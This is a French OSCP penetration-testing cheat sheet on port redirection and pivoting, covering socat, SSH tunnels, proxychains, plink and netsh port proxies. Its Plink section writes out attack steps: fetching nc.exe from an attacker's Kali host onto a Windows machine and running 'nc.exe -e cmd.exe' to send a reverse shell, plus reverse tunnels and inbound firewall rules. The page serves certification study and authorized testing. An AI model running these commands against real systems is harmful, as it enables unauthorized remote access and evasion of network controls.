---
title: "OSCP · Redirection de ports"
description: "Documenter les redirections locales, distantes et dynamiques."
---

# OSCP · Redirection de ports

Documenter les redirections locales, distantes et dynamiques.


## Redirection avec Socat

Vérifier les ports et les services de la cible autorisée.


Commande `socat` pour la rubrique « Redirection avec Socat ».

```bash
socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
```


## Redirection SSH locale

Vérifier les ports et les services de la cible autorisée.


Ouvrir une connexion SSH avec les paramètres indiqués.

```bash
ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
```


## Redirection SSH dynamique

Vérifier les ports et les services de la cible autorisée.


Ouvrir une connexion SSH avec les paramètres indiqués.

```bash
ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
```


Exemple technique pour la rubrique « Redirection SSH dynamique ».

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [local_socks_proxy_port]
```


Commande `proxychains` pour la rubrique « Redirection SSH dynamique ».

```bash
# For example
proxychains smbclient -L //internal_ip/ -U username --password=password
```


## Redirection SSH distante

Vérifier les ports et les services de la cible autorisée.


Ouvrir une connexion SSH avec les paramètres indiqués.

```bash
ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
```


## SSH Remote Dynamic Redirection de ports

Vérifier les ports et les services de la cible autorisée.


Ouvrir une connexion SSH avec les paramètres indiqués.

```bash
ssh -N -R [proxychains_port] username@remote_host
```


Exemple technique pour la rubrique « SSH Remote Dynamic Redirection de ports ».

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [proxychains_port]
```


## SSH (Windows)

Observer les permissions et la configuration de Windows.


Commande `where` pour la rubrique « SSH (Windows) ».

```powershell
where ssh
ssh.exe -V
```


Ouvrir une connexion SSH avec les paramètres indiqués.

```powershell
ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
```


Exemple technique pour la rubrique « SSH (Windows) ».

```bash
# Edit /etc/proxychains4.conf and add
[ProxyList]
socks5 127.0.0.1 [REMOTE_PORT]
```


Commande `ss` pour la rubrique « SSH (Windows) ».

```bash
ss -ntplu
```


## Plink (Windows)

Observer les permissions et la configuration de Windows.


Commande `systemctl` pour la rubrique « Plink (Windows) ».

```bash
sudo systemctl start apache2
```


**Paramètres et repères :**
`nc.exe`  


Rechercher ou filtrer des données.

```bash
find / -name nc.exe 2>/dev/null
sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
```


**Paramètres et repères :**
`nc.exe`  


Récupérer une ressource distante ou une réponse HTTP.

```powershell
wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
```


**Paramètres et repères :**
`nc.exe`  


Commande `c` pour la rubrique « Plink (Windows) ».

```powershell
C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]
```


Rechercher ou filtrer des données.

```bash
find / -name plink.exe 2>/dev/null
sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
```


Récupérer une ressource distante ou une réponse HTTP.

```powershell
wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe
```


Commande `cmd.exe` pour la rubrique « Plink (Windows) ».

```powershell
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]
```


Commande `xfreerdp` pour la rubrique « Plink (Windows) ».

```bash
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]
```


## Netsh (Windows)

Observer les permissions et la configuration de Windows.


**Paramètres et repères :**
`Netsh`  


Commande `netsh` pour la rubrique « Netsh (Windows) ».

```powershell
netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]
```


Commande `netstat` pour la rubrique « Netsh (Windows) ».

```powershell
netstat -anp TCP | find "[LISTEN_PORT]"
```


Commande `netsh` pour la rubrique « Netsh (Windows) ».

```powershell
netsh interface portproxy show all
```


Commande `netsh` pour la rubrique « Netsh (Windows) ».

```powershell
netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow
```


Ouvrir une connexion SSH avec les paramètres indiqués.

```bash
ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
```


Commande `netsh` pour la rubrique « Netsh (Windows) ».

```powershell
netsh advfirewall firewall delete rule name="[RULE_NAME]"
```


Commande `netsh` pour la rubrique « Netsh (Windows) ».

```powershell
netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
